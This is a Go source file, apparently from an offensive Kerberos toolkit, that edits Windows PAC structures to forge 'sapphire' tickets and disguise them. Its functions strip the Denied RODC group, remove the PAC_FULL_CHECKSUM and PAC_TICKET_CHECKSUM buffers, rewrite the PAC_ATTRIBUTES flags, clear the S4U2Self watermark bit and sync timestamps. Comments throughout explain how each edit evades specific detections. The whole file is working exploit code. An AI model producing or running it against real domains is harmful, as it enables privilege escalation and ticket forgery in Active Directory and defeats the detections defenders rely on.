		if ptr1 < 0x00020000 || ptr1&0xFF000000 != 0 {
			continue
		}
		if ptr2 < 0x00020000 || ptr2&0xFF000000 != 0 {
			continue
		}
		if cnt > 20 {
			continue
		}
		rgdsPtrPos = i
	}
	if rgdsPtrPos < 0 {
		return out, 1
	}

	// Build new PAC: 28 bytes removed from deferred area, ptr nulled.
	const bytesRemoved = 28
	newPAC := make([]byte, 0, len(out)-bytesRemoved)
	newPAC = append(newPAC, out[:rgdsPtrPos]...)
	newPAC = append(newPAC, []byte{0, 0, 0, 0}...) // RGDS_ptr = NULL
	newPAC = append(newPAC, out[rgdsPtrPos+4:deferredStart]...)
	newPAC = append(newPAC, out[deferredEnd:]...)

	// Update LOGON_INFO body size (4 bytes at buffer offset 8).
	bodySizePos := bufStart + 8
	bodySize := binary.LittleEndian.Uint32(newPAC[bodySizePos:])
	binary.LittleEndian.PutUint32(newPAC[bodySizePos:], bodySize-bytesRemoved)

	// Update PAC buffer-info: shrink LOGON_INFO, shift later buffer offsets.
	cBuffers := binary.LittleEndian.Uint32(newPAC[0:4])
	for i := uint32(0); i < cBuffers; i++ {
		entryOff := 8 + int(i)*16
		bt := binary.LittleEndian.Uint32(newPAC[entryOff:])
		bs := binary.LittleEndian.Uint32(newPAC[entryOff+4:])
		bo := binary.LittleEndian.Uint64(newPAC[entryOff+8:])
		if bt == LogonInfoType {
			binary.LittleEndian.PutUint32(newPAC[entryOff+4:], bs-bytesRemoved)
		} else if int(bo) > bufStart {
			binary.LittleEndian.PutUint64(newPAC[entryOff+8:], bo-uint64(bytesRemoved))
		}
	}
	return newPAC, 1
}

// StripDeniedRODCGroup removes the RID 572 (Denied RODC Password
// Replication Group) GROUP_MEMBERSHIP entry from the PAC's LOGON_INFO
// buffer via proper NDR-level edits:
//   1. Find the GroupIds conformant array (MaxCount + entries) in deferred data
//   2. Find the RID 572 entry within the array
//   3. Find GroupCount in the fixed struct (matching MaxCount, preceding a
//      pointer referent and UserFlags)
//   4. Decrement GroupCount (fixed) and MaxCount (deferred) from N to N-1
//   5. Remove the 8-byte entry; shift subsequent LOGON_INFO bytes left by 8
//   6. Shrink LOGON_INFO internal NDR body-size field by 8
//   7. Shrink LOGON_INFO buffer size in the PAC header by 8
//   8. Shift all subsequent PAC buffer offsets by -8
//
// Signatures are recomputed downstream. Safe only for N <= 10 groups.
//
// Returns the modified PAC bytes and 1 if the entry was removed, 0 otherwise.
func StripDeniedRODCGroup(pacData []byte) ([]byte, int) {
	parsed, err := ParsePACForSigning(pacData)
	if err != nil {
		return pacData, 0
	}
	logonBuf := parsed.GetBuffer(LogonInfoType)
	if logonBuf == nil {
		return pacData, 0
	}
	bufStart := int(logonBuf.Offset)
	bufEnd := bufStart + int(logonBuf.Size)

	// Step 1: locate the RID 572 entry directly by byte pattern.
	// A GROUP_MEMBERSHIP entry is 8 bytes: {uint32 RelativeId, uint32 Attributes}.
	// RID 572 = 0x0000023C. Attributes can be:
	//   0x00000007 - GroupIds entry (SE_GROUP_MANDATORY | ENABLED_BY_DEFAULT | ENABLED)
	//   0x20000007 - ResourceGroupIds entry (adds SE_GROUP_RESOURCE)
	// S4U2Self PACs typically place the Denied-RODC group in ResourceGroupIds.
	targetEntryOff := -1
	var entryAttrs uint32
	for i := bufStart; i+8 <= bufEnd; i += 4 {
		rid := binary.LittleEndian.Uint32(pacData[i:])
		if rid != 572 {
			continue
		}
		attrs := binary.LittleEndian.Uint32(pacData[i+4:])
		if attrs != 0x00000007 && attrs != 0x20000007 {
			continue
		}
		targetEntryOff = i
		entryAttrs = attrs
		break
	}
	if targetEntryOff < 0 {
		return pacData, 0
	}

	// Step 2: count group entries after RID 572 sharing the same attrs.
	entriesAfter := 0
	for off := targetEntryOff + 8; off+8 <= bufEnd && entriesAfter < 20; off += 8 {
		rid := binary.LittleEndian.Uint32(pacData[off:])
		attrs := binary.LittleEndian.Uint32(pacData[off+4:])
		if attrs != entryAttrs || rid == 0 || rid >= 1<<30 {
			break
		}
		entriesAfter++
	}

	// Step 3: walk backward from RID 572 to find MaxCount.
	arrayMaxCountPos := -1
	numEntries := 0
	for k := 0; k < 20; k++ {
		firstEntryOff := targetEntryOff - k*8
		mcPos := firstEntryOff - 4
		if mcPos < bufStart {
			break
		}
		mc := binary.LittleEndian.Uint32(pacData[mcPos:])
		expected := uint32(k + 1 + entriesAfter)
		if mc != expected {
			continue
		}
		valid := true
		for j := 0; j < k; j++ {
			eOff := firstEntryOff + j*8
			attrs := binary.LittleEndian.Uint32(pacData[eOff+4:])
			if attrs != entryAttrs {
				valid = false
				break
			}
		}
		if !valid {
			continue
		}
		arrayMaxCountPos = mcPos
		numEntries = int(expected)
		break
	}
	if arrayMaxCountPos < 0 {
		return pacData, 0
	}

	// Step 4: find the Count field in the fixed struct (GroupCount if attrs=0x7,
	// ResourceGroupCount if attrs=0x20000007). Both patterns share:
	//   [uint32 count == numEntries] [uint32 ptr: non-zero referent, high byte 0]
	// Scan ONLY the fixed-struct region (first 240 bytes of LOGON_INFO buffer:
	// 16-byte NDR common header + 4-byte conformant referent + 220-byte
	// KERB_VALIDATION_INFO struct per MS-PAC 2.5). Restricting to fixed area
	// avoids false matches in deferred data — e.g., the ExtraSids array
	// MaxCount=1 + KSAA.sid_ptr referent pattern, which appears in deferred
	// data when ExtraSids substitution preserved the array.
	countPos := -1
	expectedCount := uint32(numEntries)
	fixedEnd := bufStart + 240
	if fixedEnd > arrayMaxCountPos {
		fixedEnd = arrayMaxCountPos
	}
	for i := bufStart + 16; i+8 <= fixedEnd; i += 4 {
		cnt := binary.LittleEndian.Uint32(pacData[i:])
		ptr := binary.LittleEndian.Uint32(pacData[i+4:])
		if cnt != expectedCount {
			continue
		}
		if ptr == 0 || ptr&0xFF000000 != 0 {
			continue
		}
		countPos = i
	}
	if countPos < 0 {
		return pacData, 0
	}

	// Step 5: build new PAC. Two paths depending on whether removing this entry
	// empties the array:
	//   - removeWholeArray (numEntries==1): delete 12 bytes total
	//     (MaxCount 4 + entry 8). Set count=0 and nullify the array pointer
	//     at (countPos+4).
	//   - decrementOnly: delete 8 bytes (entry only), decrement count +
	//     MaxCount by 1.
	var newPAC []byte
	var bytesRemoved int
	if numEntries == 1 {
		bytesRemoved = 12
		newPAC = make([]byte, 0, len(pacData)-12)
		newPAC = append(newPAC, pacData[:countPos]...)
		zero := []byte{0, 0, 0, 0}
		newPAC = append(newPAC, zero...) // count = 0
		newPAC = append(newPAC, zero...) // array ptr = NULL
		newPAC = append(newPAC, pacData[countPos+8:arrayMaxCountPos]...)
		newPAC = append(newPAC, pacData[arrayMaxCountPos+4+8:]...) // skip MaxCount + entry
	} else {
		bytesRemoved = 8
		newPAC = make([]byte, 0, len(pacData)-8)
		newPAC = append(newPAC, pacData[:countPos]...)
		newCount := make([]byte, 4)
		binary.LittleEndian.PutUint32(newCount, expectedCount-1)
		newPAC = append(newPAC, newCount...)
		newPAC = append(newPAC, pacData[countPos+4:arrayMaxCountPos]...)
		newPAC = append(newPAC, newCount...) // MaxCount matches count
		newPAC = append(newPAC, pacData[arrayMaxCountPos+4:targetEntryOff]...)
		newPAC = append(newPAC, pacData[targetEntryOff+8:]...)
	}

	// Step 6: update the LOGON_INFO internal NDR body-size field
	// (4 bytes at buffer offset 8, within the 16-byte NDR common header).
	bodySizePos := bufStart + 8
	bodySize := binary.LittleEndian.Uint32(newPAC[bodySizePos:])
	binary.LittleEndian.PutUint32(newPAC[bodySizePos:], bodySize-uint32(bytesRemoved))

	// Step 7: update PAC buffer-info entries.
	cBuffers := binary.LittleEndian.Uint32(newPAC[0:4])
	for i := uint32(0); i < cBuffers; i++ {
		entryOff := 8 + int(i)*16
		bt := binary.LittleEndian.Uint32(newPAC[entryOff:])
		bs := binary.LittleEndian.Uint32(newPAC[entryOff+4:])
		bo := binary.LittleEndian.Uint64(newPAC[entryOff+8:])
		if bt == LogonInfoType {
			binary.LittleEndian.PutUint32(newPAC[entryOff+4:], bs-uint32(bytesRemoved))
		} else if int(bo) > bufStart {
			binary.LittleEndian.PutUint64(newPAC[entryOff+8:], bo-uint64(bytesRemoved))
		}
	}

	return newPAC, 1
}

// UserFlags bits in KERB_VALIDATION_INFO (MS-PAC 2.5)
const (
	LogonExtraSIDs       uint32 = 0x00000020 // ExtraSids array non-empty
	LogonResourceGroups  uint32 = 0x00000200 // S4U2Self watermark — resource groups inherited
)

// PAC_ATTRIBUTES_INFO flags (MS-PAC 2.14)
const (
	PACWasRequested        uint32 = 0x00000001 // Client sent pA-PAC-REQUEST (normal AS-REQ)
	PACWasGivenImplicitly  uint32 = 0x00000002 // KDC gave PAC without explicit request (S4U2Self)
)

// FullChecksumType is PAC_FULL_CHECKSUM (MS-PAC 2.8.1, added in KB5020805, Nov 2022).
// Keyed HMAC over the entire PAC using the KDC key; explicitly designed to detect
// PAC transplantation attacks like sapphire. DCs predating KB5020805 never emit it.
const FullChecksumType uint32 = 19

// removePACBuffer is the generic helper used by RemovePACFullChecksum and
// RemovePACTicketChecksum. It removes the first buffer matching bufType from
// the PAC, shrinking the header and rewriting remaining buffers' offsets.
func removePACBuffer(pacData []byte, bufType uint32) ([]byte, int) {
	parsed, err := ParsePACForSigning(pacData)
	if err != nil {
		return pacData, 0
	}

	var targetBuf *PACBuffer
	targetIdx := -1
	for i := range parsed.Buffers {
		if parsed.Buffers[i].Type == bufType {
			targetBuf = &parsed.Buffers[i]
			targetIdx = i
			break
		}
	}
	if targetBuf == nil {
		return pacData, 0
	}

	removedDataAligned := (int(targetBuf.Size) + 7) &^ 7
	newPACSize := len(pacData) - 16 - removedDataAligned
	newPAC := make([]byte, newPACSize)

	// New header: decremented cBuffers, same Version
	binary.LittleEndian.PutUint32(newPAC[0:4], uint32(len(parsed.Buffers)-1))
	binary.LittleEndian.PutUint32(newPAC[4:8], parsed.Version)

	// Compute new data offset for a remaining buffer:
	//   - Info array is 16 bytes smaller → all data shifts up by 16
	//   - If this buffer's data came AFTER the removed buffer's data,
	//     also shift up by the removed data's aligned size
	newOffsetOf := func(origOffset uint64) uint64 {
		if origOffset < targetBuf.Offset {
			return origOffset - 16
		}
		return origOffset - 16 - uint64(removedDataAligned)
	}

	// Write remaining buffer-info entries (in original order, skipping target)
	infoOff := 8
	for i := range parsed.Buffers {
		if i == targetIdx {
			continue
		}
		buf := &parsed.Buffers[i]
		binary.LittleEndian.PutUint32(newPAC[infoOff:], buf.Type)
		binary.LittleEndian.PutUint32(newPAC[infoOff+4:], buf.Size)
		binary.LittleEndian.PutUint64(newPAC[infoOff+8:], newOffsetOf(buf.Offset))
		infoOff += 16
	}

	// Copy buffer data to new offsets
	for i := range parsed.Buffers {
		if i == targetIdx {
			continue
		}
		buf := &parsed.Buffers[i]
		oldStart := int(buf.Offset)
		oldEnd := oldStart + int(buf.Size)
		if oldEnd > len(pacData) {
			continue
		}
		newStart := int(newOffsetOf(buf.Offset))
		copy(newPAC[newStart:], pacData[oldStart:oldEnd])
	}

	return newPAC, 1
}

// RemovePACFullChecksum strips the PAC_FULL_CHECKSUM buffer (type 19) from the PAC.
//
// The buffer is recomputed by the KDC on patched DCs and would need to be
// recomputed after any PAC mutation to remain valid. Removing it instead makes
// the PAC look like it was issued by a pre-KB5020805 DC — detections that
// validate type-19 if present but don't require its presence will skip validation.
//
// Structural: removes one 16-byte buffer-info entry from the header array and
// the (aligned) 16 bytes of buffer data, then rewrites all remaining buffers'
// data offsets to account for both shrinks. Decrements cBuffers by 1.
//
// Must run BEFORE re-signing so that SERVER_CHECKSUM and KDC_CHECKSUM cover
// the new (shrunk) PAC layout.
//
// Returns the modified PAC bytes and 1 if a type-19 buffer was removed, 0 otherwise.
func RemovePACFullChecksum(pacData []byte) ([]byte, int) {
	return removePACBuffer(pacData, FullChecksumType)
}

// filetimeEpochDiff is the number of 100-nanosecond intervals between
// 1601-01-01 UTC (Windows FILETIME epoch) and 1970-01-01 UTC (Unix epoch).
const filetimeEpochDiff = 116444736000000000

// timeToFILETIME converts a Go time.Time to a Windows FILETIME uint64
// (100-nanosecond intervals since 1601-01-01 UTC).
func timeToFILETIME(t time.Time) uint64 {
	return uint64(t.UnixNano()/100) + filetimeEpochDiff
}

// SyncClientInfoTimestamp rewrites the ClientId FILETIME at the start of the
// CLIENT_INFO buffer (MS-PAC 2.7) to match the provided time. On legit TGTs
// issued by the KDC, CLIENT_INFO.ClientId is set to the ticket's AuthTime.
// Sapphire tickets inherit the S4U2Self issuance time, which doesn't match
// the forged TGT's AuthTime — a consistency-check detection would flag this.
//
// Writes 8 bytes (little-endian uint64) at the start of the CLIENT_INFO
// buffer data. NameLength and Name fields that follow are preserved.
//
// Must run BEFORE re-signing so SERVER_CHECKSUM and KDC_CHECKSUM cover the
// new bytes.
//
// Returns the modified PAC bytes and 1 if the buffer was updated, 0 if
// CLIENT_INFO wasn't present.
func SyncClientInfoTimestamp(pacData []byte, t time.Time) ([]byte, int) {
	parsed, err := ParsePACForSigning(pacData)
	if err != nil {
		return pacData, 0
	}

	clientInfoBuf := parsed.GetBuffer(ClientInfoType)
	if clientInfoBuf == nil || clientInfoBuf.Size < 8 {
		return pacData, 0
	}

	out := make([]byte, len(pacData))
	copy(out, pacData)

	offset := int(clientInfoBuf.Offset)
	if offset+8 > len(out) {
		return pacData, 0
	}

	binary.LittleEndian.PutUint64(out[offset:offset+8], timeToFILETIME(t))

	return out, 1
}

// RemovePACTicketChecksum strips the PAC_TICKET_CHECKSUM buffer (type 16) from
// the PAC.
//
// PAC_TICKET_CHECKSUM (MS-PAC 2.15, added in KB5008380, July 2021) is a keyed
// HMAC over the entire EncTicketPart encoding (with the PAC's own signature
// fields zeroed). Its explicit purpose is to prevent PAC transplantation between
// tickets — exactly what sapphire does. Because goobeus transplants a PAC from
// an S4U2Self service ticket into a forged TGT's EncTicketPart (with cname
// swapped and re-encrypted), the inherited TICKET_CHECKSUM is invalid.
//
// Removing the buffer makes the PAC look pre-KB5008380. Detections that
// validate type-16 if present but fail open on absence will skip validation.
//
// WARNING: DCs in strict KB5008380 enforcement mode may REJECT tickets that
// lack a valid PAC_TICKET_CHECKSUM. If auth fails after stripping, the DC is
// enforcing and a proper recomputation (Option B) would be needed instead.
//
// Returns the modified PAC bytes and 1 if a type-16 buffer was removed, 0 otherwise.
func RemovePACTicketChecksum(pacData []byte) ([]byte, int) {
	return removePACBuffer(pacData, TicketChecksumType)
}

// RewritePACAttributesRequested rewrites PAC_ATTRIBUTES_INFO.Flags from
// PAC_WAS_GIVEN_IMPLICITLY (0x2) to PAC_WAS_REQUESTED (0x1).
//
// The KDC sets Flags=0x2 when it issues a PAC without an explicit client request —
// this is the S4U2Self case. A normal AS-REQ from a Windows client (which sends
// pA-PAC-REQUEST) gets Flags=0x1. Rewriting makes the PAC look AS-REQ-derived.
//
// Operates on the ATTRIBUTES_INFO buffer (type 17). Clears the 0x2 bit and sets
// the 0x1 bit while preserving any other flag bits. Signatures are recomputed
// downstream by ResignPAC / ResignPACWithKeys.
//
// Returns the modified PAC bytes and the number of rewrites performed.
func RewritePACAttributesRequested(pacData []byte) ([]byte, int) {
	parsed, err := ParsePACForSigning(pacData)
	if err != nil {
		return pacData, 0
	}

	out := make([]byte, len(pacData))
	copy(out, pacData)
	count := 0

	for _, buf := range parsed.Buffers {
		if buf.Type != AttributesType {
			continue
		}
		bufStart := int(buf.Offset)
		if buf.Size < 8 || bufStart+8 > len(out) {
			continue
		}
		// PAC_ATTRIBUTES_INFO layout:
		//   uint32 FlagsLength (bit count)
		//   uint32 Flags
		flagsOffset := bufStart + 4
		flags := binary.LittleEndian.Uint32(out[flagsOffset : flagsOffset+4])
		newFlags := (flags &^ PACWasGivenImplicitly) | PACWasRequested
		if newFlags != flags {
			binary.LittleEndian.PutUint32(out[flagsOffset:flagsOffset+4], newFlags)
			count++
		}
	}

	return out, count
}

// StripLogonResourceGroupsFlag clears the LOGON_RESOURCE_GROUPS (0x200) bit from
// KERB_VALIDATION_INFO.UserFlags in the PAC's LOGON_INFO buffer.
//
// The KDC sets this bit on S4U2Self tickets. A legitimate AS-REQ TGT never has
// this bit set, so it's a structural watermark that persists through sapphire
// forgery. Clearing it makes the PAC's UserFlags look like a normal AS-REP result.
//
// Implementation: scans within the LOGON_INFO buffer only (not the whole PAC) for
// the little-endian uint32 value 0x00000220 (LOGON_EXTRA_SIDS | LOGON_RESOURCE_GROUPS,
// the typical S4U2Self value). Flips the 0x200 bit to zero, leaving 0x00000020.
//
// Signatures are recomputed downstream by ResignPAC / ResignPACWithKeys.
//
// Returns the modified PAC bytes and the number of rewrites performed.
func StripLogonResourceGroupsFlag(pacData []byte) ([]byte, int) {
	parsed, err := ParsePACForSigning(pacData)
	if err != nil {
		return pacData, 0
	}

	out := make([]byte, len(pacData))
	copy(out, pacData)
	count := 0

	// UserFlags 0x220 in little-endian is 20 02 00 00.
	// We scan only within LOGON_INFO to minimize false-positive surface.
	target := []byte{0x20, 0x02, 0x00, 0x00}

	for _, buf := range parsed.Buffers {
		if buf.Type != LogonInfoType {
			continue
		}
		bufStart := int(buf.Offset)
		bufEnd := bufStart + int(buf.Size)
		if bufStart < 0 || bufEnd > len(out) {
			continue
		}
		for i := bufStart; i+len(target) <= bufEnd; i++ {
			if bytes.Equal(out[i:i+len(target)], target) {
				out[i+1] = 0x00 // clear the 0x200 bit (byte offset 1 of the LE uint32)
				count++
			}
		}
	}

	return out, count
}
